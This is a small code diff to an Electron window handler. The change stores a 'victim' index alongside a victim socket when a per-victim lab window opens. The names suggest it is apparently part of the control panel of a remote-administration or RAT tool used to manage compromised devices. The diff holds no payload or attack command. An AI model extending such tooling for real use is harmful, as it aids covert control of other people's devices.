@@ -511,6 +511,7 @@ ipcMain.on('openLabWindow', function (e, page, index, startHash) {
 
   // pass the victim info to this victim lab
   child.webContents.victim = victimsList.getVictim(index).socket;
+  child.webContents.victimId = index;
   const labUrl = 'file://' + __dirname + '/app/' + page + (startHash || '');
   child.loadURL(labUrl)
 
